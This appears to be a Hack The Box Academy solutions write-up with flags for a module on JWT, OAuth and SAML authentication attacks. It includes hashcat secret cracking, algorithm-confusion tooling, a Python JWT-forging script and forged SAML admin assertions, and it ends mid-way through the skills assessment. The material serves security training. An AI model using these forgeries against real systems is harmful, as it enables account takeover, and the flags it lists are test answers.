| Section                          | Question Number | Answer                                |
| -------------------------------- | --------------- | ------------------------------------- |
| Attacking Signature Verification | Question 1      | HTB{afe9c41393d7a51dec120be82f6868f1} |
| Attacking the Signing Secret     | Question 1      | HTB{f57fa9076d67a608b012c80f91ece14b} |
| Algorithm Confusion              | Question 1      | HTB{47aeb64026443c76cb34367c911557a6} |
| Further JWT Attacks              | Question 1      | HTB{8f0e5651aec8bb3d97faa16e029adc60} |
| OAuth Lab Setup                  | Question 1      | 1234                                  |
| Stealing Access Tokens           | Question 1      | /client/callback                      |
| Improper CSRF Protection         | Question 1      | state                                 |
| Additional OAuth Vulnerabilities | Question 1      | XSS                                   |
| SAML Lab Setup                   | Question 1      | 1234                                  |
| Signature Exclusion Attack       | Question 1      | HTB{77ca32d7940bb36d757eb798595e39c5} |
| Signature Wrapping Attack        | Question 1      | HTB{04598778edf221127c5ff71b5834bdb4} |
| Skills Assessment                | Question 1      | HTB{b9bb6a3738e870e1ac0000e90c2bb022} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Attacking Signature Verification

## Question 1

### "Escalate your privileges to obtain the flag."

After spawning the target machine and visiting its root web page, students need to log in with the credentials `htb-stdnt:AcademyStudent!`, intercept the request with Burp, and send it to Repeater:

![[HTB Solutions/CWEE/z. images/d5792e3f108b7b9e91d82fae27ec1e0d_MD5.jpg]]

After sending the request and analyzing the response, students will discover that the web application utilizes JWTs for handling sessions:

![[HTB Solutions/CWEE/z. images/006ee3b5601e62cba91fde334905c196_MD5.jpg]]

When decoding the JWT with [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Decode\(\)), students will notice that it has the 'isAdmin' claim set to `false`:

![[HTB Solutions/CWEE/z. images/25f3521b73fd7b2b526ca73c6003f198_MD5.jpg]]

The web application is misconfigured to accept JWTs signed with the `None` algorithm. Therefore, using [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Sign\('','None'\)), students need to set the 'isAdmin' claim to `true` and sign the altered JWT with the `None` algorithm:

![[HTB Solutions/CWEE/z. images/cbfea95307da962fe37aaf5cce48d464_MD5.jpg]]

At last, students need to use the altered JWT with the request to the `/home` page to attain the flag `HTB{afe9c41393d7a51dec120be82f6868f1}`:

![[HTB Solutions/CWEE/z. images/9b0a979d700df5f56e7b9d7762ccf7d8_MD5.jpg]]

Answer: `HTB{afe9c41393d7a51dec120be82f6868f1}`

# Attacking the Signing Secret

## Question 1

### "Escalate your privileges to obtain the flag."

After spawning the target machine and visiting its root web page, students need to log in with the credentials `htb-stdnt:AcademyStudent!`, intercept the request with Burp, and send it to Repeater:

![[HTB Solutions/CWEE/z. images/35ff06f09f0b4547f7faf0da05807667_MD5.jpg]]

After sending the request and analyzing the response, students will discover that the web application utilizes JWTs for handling sessions:

![[HTB Solutions/CWEE/z. images/7391f5b76d2760b3ee352320b0ab136c_MD5.jpg]]

When decoding the JWT with [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Decode\(\)), students will notice that it has the 'isAdmin' claim set to `false`:

![[HTB Solutions/CWEE/z. images/0423512adde8a1ed467259f9c8a3dabc_MD5.jpg]]

The web application uses a cryptographically insecure signing secret for JWTs. Therefore, using `hashcat` with the hash-mode `16500`, students need to brute-force the signing secret, finding it to be `rayoleos`:

Code: shell

```shell
sudo hashcat -w 3 -O -m 16500 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxNDMwMTc3N30.K2y-aHrmPUjBOa3WEkHZEXEgFhgJEsfRNTu706XF0Go' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-ucupdcvxyg]─[~]
└──╼ [★]$ sudo hashcat -w 3 -O -m 16500 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxNDMwMTc3N30.K2y-aHrmPUjBOa3WEkHZEXEgFhgJEsfRNTu706XF0Go' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]

==================================================================

* Device #1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU

<SNIP>

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxNDMwMTc3N30.K2y-aHrmPUjBOa3WEkHZEXEgFhgJEsfRNTu706XF0Go:rayoleos

<SNIP>
```

Subsequently, using [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Sign\('rayoleos','HS256'\)), students need to set the 'isAdmin' claim to `true` and sign the altered JWT with the `HS256` algorithm, using the signing secret `rayoleos`:

![[HTB Solutions/CWEE/z. images/f2c672661aa182b1c9c80d9d1dcda061_MD5.jpg]]

At last, students need to use the altered JWT with the request to the `/home` page to attain the flag `HTB{f57fa9076d67a608b012c80f91ece14b}`:

![[HTB Solutions/CWEE/z. images/f1b2a9597e4d01b0138640e5c1b89c72_MD5.jpg]]

Answer: `HTB{f57fa9076d67a608b012c80f91ece14b}`

# Algorithm Confusion

## Question 1

### "Escalate your privileges to obtain the flag."

After spawning the target machine and visiting its root web page, students need to log in with the credentials `htb-stdnt:AcademyStudent!`, intercept the request with Burp, and send it to Repeater:

![[HTB Solutions/CWEE/z. images/cb1ba4c8ad9279ac4849aae8597bfd8a_MD5.jpg]]

After sending the request and analyzing the response, students will discover that the web application utilizes JWTs for handling sessions:

![[HTB Solutions/CWEE/z. images/21c80bb2392e500a49f0fb5f9eab9edf_MD5.jpg]]

When decoding the JWT with [jwt.io](https://enterprise.hackthebox.com/academy-lab/7397/3329/modules/170/jwt.io), students will notice that it uses the asymmetric signing algorithm `RS256` and sets the 'isAdmin' claim to `false`:

![[HTB Solutions/CWEE/z. images/fbad1ea8b4c89063db64a4c623b121a7_MD5.jpg]]

The web application is misconfigured to accept JWTs signed with the symmetric `HS256` algorithm using the public key as the signing secret. Therefore, students need to perform an algorithm confusion attack.

To attain the public key used by the web application for signature verification, students first need to ensure that the Docker service is started:

Code: shell

```shell
sudo systemctl start docker
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-jkuqq0uhdd]─[~]
└──╼ [★]$ sudo systemctl start docker
```

Thereafter, students need to download [rsa\_sign2n](https://github.com/silentsignal/rsa_sign2n) and build its Docker container:

Code: shell

```shell
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
sudo docker build . -t sig2n
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-jkuqq0uhdd]─[~]
└──╼ [★]$ git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
sudo docker build . -t sig2n

Cloning into 'rsa_sign2n'...
remote: Enumerating objects: 117, done.
remote: Counting objects: 100% (117/117), done.
remote: Compressing objects: 100% (81/81), done.
remote: Total 117 (delta 50), reused 94 (delta 30), pack-reused 0
Receiving objects: 100% (117/117), 39.19 KiB | 5.60 MiB/s, done.
Resolving deltas: 100% (50/50), done.
[+] Building 28.2s (11/11) FINISHED docker:default
 => [internal] load build definition from Dockerfile 0.0s
<SNIP>
```

Students then need to run the `sig2n` Docker container, interacting with it using the `bash` shell:

Code: shell

```shell
sudo docker run -it sig2n /bin/bash
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-jkuqq0uhdd]─[~/rsa_sign2n/standalone]
└──╼ [★]$ sudo docker run -it sig2n /bin/bash

root@97732a2a2840:/app#
```

Afterward, students need to run `jwt_forgery.py` and provide it with at least two JWTs from the web application (students can send the POST request to the '/login' endpoint multiple times). Students will attain the public key in the `*_509.pem` file:

Code: shell

```shell
python3.8 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<SNIP> eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<SNIP>
```

```
root@7ca7616f4c34:/app# python3.8 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<SNIP> eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<SNIP>

[*] GCD: 0x1
[*] GCD: 0xb1969268f0e66b1c9db3f34ca699e8754116a2640476efa9e7b4f807bb63099a749d1424d479ce47c2e<SNIP>
[+] Found n with multiplier 1 :
 0xb1969268f0e66b1c9db3f34ca699e8754116a2640476efa9e7b4f807bb63099a749d1424d479ce47c2e<SNIP>
[+] Written to b1969268f0e66b1c_65537_x509.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzE0NDQzNTcyfQ.Zobl03_ur9SUaAb3wzovXPo7VIE0ORO5Y0zYhggLRJQ'
[+] Written to b1969268f0e66b1c_65537_pkcs1.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzE0NDQzNTcyfQ.jlhxuL8p97-J6ugps45yZqBIbS1TViJJuvujz-5YiIQ'
```

Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Sign\('','HS256'\)), students then need to set the 'isAdmin' claim to `true` and sign the alerted JWT with the `HS256` algorithm, using the public key as the signing secret (appending a new line to it is necessary):

![[HTB Solutions/CWEE/z. images/96235b1d2a56a4da1d7742c89e366b8e_MD5.jpg]]

At last, students need to use the altered JWT with the request to the `/home` page to attain the flag `HTB{47aeb64026443c76cb34367c911557a6}`:

![[HTB Solutions/CWEE/z. images/de03dde36bf52ef6df6d5f4f0d90e282_MD5.jpg]]

Answer: `HTB{47aeb64026443c76cb34367c911557a6}`

# Further JWT Attacks

## Question 1

### "Escalate your privileges to obtain the flag."

After spawning the target machine and visiting its root web page, students need to log in with the credentials `htb-stdnt:AcademyStudent!`, intercept the request with Burp, and send it to Repeater:

![[HTB Solutions/CWEE/z. images/d6bd0236a0d94fd692375d23a966628e_MD5.jpg]]

After sending the request and analyzing the response, students will discover that the web application utilizes JWTs for handling sessions:

![[HTB Solutions/CWEE/z. images/184b71ce1624ea302142f23562f509e9_MD5.jpg]]

When decoding the JWT with [jwt.io](https://enterprise.hackthebox.com/academy-lab/7397/3329/modules/170/jwt.io), students will notice that it uses the `jwk` claim and sets the 'isAdmin' claim to `false`:

![[HTB Solutions/CWEE/z. images/fff47b0a5432b6b9dcd3c7f6f2a5be67_MD5.jpg]]

The web application is misconfigured to accept arbitrary keys provided in the `jwk` claim. Therefore, students need to forge a JWT, sign it with an arbitrary private key, and then provide the corresponding public key in the `jwk` claim for the web application to verify the signature and accept the altered JWT.

Students first need to utilize `openssl` to generate a private-public key pair using the RSA algorithm:

Code: shell

```shell
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-kbtmqmbsyt]─[~]
└──╼ [★]$ openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem

............................................................+++++
...........................................................................+++++
writing RSA key
```

Subsequently, students need to forge a JWT with the 'isAdmin' claim set to `true`, the `jwk` claim containing the details of the public key generated, and sign it with asymmetric `RS256` algorithm, using the generated private key as the signing secret.

To forge the JWT, students can create a custom script or utilize the one provided in the section (making sure to install the `pip` dependencies `pyjwt cryptography python-jose` beforehand):

Code: python

```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})
print(token)
```

After running the script, students will attain the JWT:

Code: shell

```shell
python3 exploit.py
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-kbtmqmbsyt]─[~]
└──╼ [★]$ python3 exploit.py

eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImt0eSI6IlJTQSIsIm4iOiI2ZUpxYzl1cWNEcmRKMjg2Z1lwMi1ndWZPZ3dGMC1oWUZXQzVfTHJZMDJNblNhOUU0cmdrR0NtT3AwdGo1cHFQRU51bDR5VjktekpKaVNyYW0yUlV5REhLbTM3RzVybTBuYTZZQW1VbVNHdzY0M05xemlSekFkUWRsUE1taHBINW5NMk9mUEtTQ0VCQXhTUjJNUU91b2lkUnd2cDFRaXBRSlF0elVoSUc3czY1aXc4RzE4cHB0akVUSWRReXc5OWgwV3Fobzd1cWtiN0JoRXpwWE14VndrWURlUTRxdHF0V2EzOHJwQXFrRnIwN2xSNjNlbTE1X0ZyNmN5U1k5SmlTbmxLYjAxdVpRbjJCS19XNjd6bXVBYk9VNlZKTVVFdVFEYkNxV3FqSGowUVNkUEVKbmxld0tfUVJkQXRxNUJpeEhRMXNGUktBRHl4RHpxbmJzS1lXU1EiLCJlIjoiQVFBQiJ9fQ.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZX0.DseY85yPfuYflnAVLzbx7tLQnlu9fMSI0oP91SGMMKzwiHJKghNvYTsBbdofq6h9DbPEkZrmGhZFdcFnkN3uQLQWiCT5N1_X714qxz5g_FI3biPZzDDl41UCC10lPyv4LTVODckCyDi6lC4y-T8TIyaAKM-BqMMZ5O6z2wvyKeUGbGrfRzNfUsYHCRt3RQVDD2Y6QLfIrWoHXAq4RMtodiOvCqkloZbXQJPh8oCBYvAxsUWqLSs00JDwuk613qmKH91iuFdv2ay_n7pGUacyaz1w0oa3oOdBqMAMyz-HBcjM29jC1wzOZQS0tRrD_x-OCHUwduhDtChTFti9eNNBsw
```

At last, students need to use the forged JWT with the request to the `/home` page to attain the flag `HTB{8f0e5651aec8bb3d97faa16e029adc60}`:

![[HTB Solutions/CWEE/z. images/2cba9a91030a3c80a2c72b6c18fdc7b6_MD5.jpg]]

Answer: `HTB{8f0e5651aec8bb3d97faa16e029adc60}`

# OAuth Lab Setup

## Question 1

### "Familiarize yourself with the lab environment. What is the user's ID?"

Students are encouraged to follow along with the section to get familiar with the OAuth lab environment.

After spawning the target machine, students first need to navigate to the `/client/login` page and click on the "Log in with your HubGit.htb Account" button (which sends the `Authorization Request` to the authorization server):

![[HTB Solutions/CWEE/z. images/ce85bcd1e4404037a2025efd43e23793_MD5.jpg]]

Afterward, students need to provide the credentials `htb-stdnt:AcademyStudent!` for the authorization server's authorization prompt:

![[HTB Solutions/CWEE/z. images/6faa8ece696026e9d2662b5ff367d89b_MD5.jpg]]

After successfully signing in, students will get redirected to `academy.htb`, discovering that the user's ID is `1234`:

![[HTB Solutions/CWEE/z. images/bf733fb827d298179e323877c59c8f6b_MD5.jpg]]

Answer: `1234`

# Stealing Access Tokens

## Question 1

### "Try what you learned in the section for yourself. What is the value of the redirect\_uri parameter set by the authorization server?"

Students are highly encouraged to follow along with the section to learn how to discover and exploit the vulnerability.

After spawning the target machine and navigating to the '/client/login' page, students will find that when hovering over the 'Log in with your HubGit.htb Account' button, the authorization server sets the `redirect_uri` parameter to `/client/callback`:

![[HTB Solutions/CWEE/z. images/0f6a1869b3536ebd6a9fc7d8b2eb0a19_MD5.jpg]]

Answer: `/client/callback`

# Improper CSRF Protection

## Question 1

### "Try what you learned in the section for yourself. What is the name of the parameter that can be used to prevent CSRF attacks?"

Students are highly encouraged to follow along with the section to learn how to discover and exploit the vulnerability.

The `state` parameter can be used to prevent OAuth CSRF attacks:

![[HTB Solutions/CWEE/z. images/13f2c71822db8363ea984a0687458384_MD5.jpg]]

Answer: `state`

# Additional OAuth Vulnerabilities

## Question 1

### "Try what you learned in the section for yourself. What is the acronym of the vulnerability the lab is vulnerable to?"

Students are highly encouraged to follow along with the section to learn how to discover and exploit the vulnerability.

`XSS` is the acronym of the vulnerability that the lab is vulnerable to:

![[HTB Solutions/CWEE/z. images/9fc82bb7d7726d04aed5fcf50dc0b482_MD5.jpg]]

Answer: `XSS`

# Signature Exclusion Attack

## Question 1

### "Execute a Signature Exclusion attack to obtain a session as the user admin."

After spawning the target machine, students first need to add the required vHost entires `academy.htb` and `sso.htb` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP academy.htb sso.htb" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-kbtmqmbsyt]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.229.215 academy.htb sso.htb" >> /etc/hosts'
```

Subsequently, students need to navigate to `academy.htb` and click on the "Log in with our HackTheBox SSO" button:

![[HTB Solutions/CWEE/z. images/70b461fb1cdd2a9d482a320f280c1b68_MD5.jpg]]

Students need to log in using the credentials `htb-stdnt:AcademyStudent!`:

![[HTB Solutions/CWEE/z. images/93ed9053e29c29fe913fa84b1bcb90fb_MD5.jpg]]

Afterward, students need to refresh the page, intercept the request with Burp, and send it to Repeater:

![[HTB Solutions/CWEE/z. images/f3ceb41aa354fe4ab9d21e04181e4467_MD5.jpg]]

Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode\(\)From_Base64\('A-Za-z0-9%2B/%3D',true,false\)), students then need to URL-decode and base64-decode the `SAMLResponse` to attain the XML-representation of the SAML data:

![[HTB Solutions/CWEE/z. images/2f513698466b2900c25ad662e5a3feea_MD5.jpg]]

The service provider is misconfigured to verify the signature only if one is present and defaults to accepting the SAML response if one is absent.

Therefore, to perform the Signature Exclusion attack, students need to remove the two signatures from the SAML data and manipulate it to impersonate the admin user, setting the attribute "name" to `admin`:

Code: xml

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_b287445072ebaa9b9fc84e237edbc3a85aa16b9bd4" Version="2.0" IssueInstant="2024-05-01T21:06:25Z" Destination="http://academy.htb/acs.php" InResponseTo="ONELOGIN_91918926d00e67a4c7d61449bc67f4339a9aae16"><saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_04601493f2a924fdfb4b3eeb3ed4f192534ddc0f93" Version="2.0" IssueInstant="2024-05-01T21:06:25Z"><saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer><saml:Subject><saml:NameID SPNameQualifier="http://academy.htb/" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_50295577ac1cbbc94ad5f208f65bd890caaf4d2e15</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2024-05-01T21:11:25Z" Recipient="http://academy.htb/acs.php" InResponseTo="ONELOGIN_91918926d00e67a4c7d61449bc67f4339a9aae16"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2024-05-01T21:05:55Z" NotOnOrAfter="2024-05-01T21:11:25Z"><saml:AudienceRestriction><saml:Audience>http://academy.htb/</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="2024-05-01T21:06:25Z" SessionNotOnOrAfter="2024-05-02T05:06:25Z" SessionIndex="_70b4273e7d27afd9c2f874b6baac84d4b285800a17"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="id" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">1234</saml:AttributeValue></saml:Attribute><saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue></saml:Attribute><saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin@academy.htb</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
```

Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64\('A-Za-z0-9%2B/%3D'\)URL_Encode\(true\)), students need to base64-encode and URL-encode the altered XML data:

![[HTB Solutions/CWEE/z. images/5fcf98eb48134ac3d6cb5fb4fb76e0ba_MD5.jpg]]

At last, students need to use the altered SAMLResponse with the request to the `/acs.php` page to attain the flag `HTB{77ca32d7940bb36d757eb798595e39c5}`:

![[HTB Solutions/CWEE/z. images/b71a1280cd94c66044a8c9e5590a250d_MD5.jpg]]

Answer: `HTB{77ca32d7940bb36d757eb798595e39c5}`

# Signature Wrapping Attack

## Question 1

### "Execute a Signature Wrapping attack to obtain a session as the user admin."

After spawning the target machine, students first need to add the required vHost entires `academy.htb` and `sso.htb` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP academy.htb sso.htb" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-kbtmqmbsyt]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.229.216 academy.htb sso.htb" >> /etc/hosts'
```

Subsequently, students need to navigate to `academy.htb` and click on the "Log in with our HackTheBox SSO" button:

![[HTB Solutions/CWEE/z. images/5c04744fcea6a06e33aa992f8e461174_MD5.jpg]]

Students need to log in using the credentials `htb-stdnt:AcademyStudent!`:

![[HTB Solutions/CWEE/z. images/158cfbbd2500728d6658a753d43b09ff_MD5.jpg]]

Afterward, students need to refresh the page, intercept the request with Burp, and send it to Repeater:

![[HTB Solutions/CWEE/z. images/559f51c88bbe6582ab90cec9ca103ae5_MD5.jpg]]

Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode\(\)From_Base64\('A-Za-z0-9%2B/%3D',true,false\)), students then need to URL-decode and base64-decode the `SAMLResponse` to attain the XML-representation of the SAML data:

![[HTB Solutions/CWEE/z. images/4bfe73da6055d9f2bd55a7990a505429_MD5.jpg]]

The web application utilizes a SAML implementation that is vulnerable to signature wrapping. To execute the Signature Wrapping attack, students need to inject an altered assertion into the SAML response, which does not invalidate the signature but potentially confuses the application. The application will use the injected and unsigned assertion instead of the signed assertion.

Using the same assertion from the XML data, students need to copy it and remove its signature, manipulating it to impersonate the admin user by setting the attribute 'name' to 'admin':

Code: xml

```xml
<saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_htbAcademy" Version="2.0" IssueInstant="2024-05-01T05:54:15Z"><saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer><saml:Subject><saml:NameID SPNameQualifier="http://academy.htb/" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_c8968a854be4aaf3f629e0413de9a9654ea9a3cee0</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2024-05-01T05:59:15Z" Recipient="http://academy.htb/acs.php" InResponseTo="ONELOGIN_593cb1722e46ae84797b5a52c612321493e29101"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2024-05-01T05:53:45Z" NotOnOrAfter="2024-05-01T05:59:15Z"><saml:AudienceRestriction><saml:Audience>http://academy.htb/</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="2024-05-01T05:54:15Z" SessionNotOnOrAfter="2024-05-01T13:54:15Z" SessionIndex="_49f3e665e90031588c50b65f84ca785f39ae7edda8"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="id" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">1</saml:AttributeValue></saml:Attribute><saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue></saml:Attribute><saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin@academy.htb</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>
```

Subsequently, students need to inject the altered assertion into the original SAMLResponse, making sure it is before the original signed assertion:

Code: xml

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_74692c7cb94c2b1815c48bdfe32a1a74373b3de779" Version="2.0" IssueInstant="2024-05-01T05:54:15Z" Destination="http://academy.htb/acs.php" InResponseTo="ONELOGIN_593cb1722e46ae84797b5a52c612321493e29101"><saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_htbAcademy" Version="2.0" IssueInstant="2024-05-01T05:54:15Z"><saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer><saml:Subject><saml:NameID SPNameQualifier="http://academy.htb/" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_c8968a854be4aaf3f629e0413de9a9654ea9a3cee0</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2024-05-01T05:59:15Z" Recipient="http://academy.htb/acs.php" InResponseTo="ONELOGIN_593cb1722e46ae84797b5a52c612321493e29101"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2024-05-01T05:53:45Z" NotOnOrAfter="2024-05-01T05:59:15Z"><saml:AudienceRestriction><saml:Audience>http://academy.htb/</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="2024-05-01T05:54:15Z" SessionNotOnOrAfter="2024-05-01T13:54:15Z" SessionIndex="_49f3e665e90031588c50b65f84ca785f39ae7edda8"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="id" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">1</saml:AttributeValue></saml:Attribute><saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue></saml:Attribute><saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin@academy.htb</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>[SNIP]</samlp:Response>
```

Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64\('A-Za-z0-9%2B/%3D'\)URL_Encode\(true\)), students need to base64-encode and URL-encode the altered XML data:

![[HTB Solutions/CWEE/z. images/78c097f19dc385524666da44ae51a2c5_MD5.jpg]]

At last, students need to use the altered SAMLResponse with the request to the `/acs.php` page to attain the flag `HTB{04598778edf221127c5ff71b5834bdb4}`:

![[HTB Solutions/CWEE/z. images/9076f0b5a39959747827b1001a7fe27a_MD5.jpg]]

Answer: `HTB{04598778edf221127c5ff71b5834bdb4}`

# Skills Assessment

## Question 1

### "Obtain the flag."

After spawning the target machine, students need to navigate to the '/login' page and sign in using the credentials `htb-stdnt:AcademyStudent!`:

![[HTB Solutions/CWEE/z. images/0ed8ad933b9ec945b508a3af5f1a1adb_MD5.jpg]]

When visiting the '/admin/ page, students will notice it displays "Access denied.". Additionally, students will discover that the web application uses JWTs for handling sessions:

![[HTB Solutions/CWEE/z. images/eb2130aa8b6d5fb52f07cc27c0e4ef86_MD5.jpg]]

When decoding the JWT with [jwt.io](https://enterprise.hackthebox.com/academy-lab/7397/3329/modules/170/jwt.io), students will notice that it uses the asymmetric signing algorithm `RS256` and sets the 'accountType' claim to 'user':

![[HTB Solutions/CWEE/z. images/fc4349076ca24757a238ba3180f2282d_MD5.jpg]]

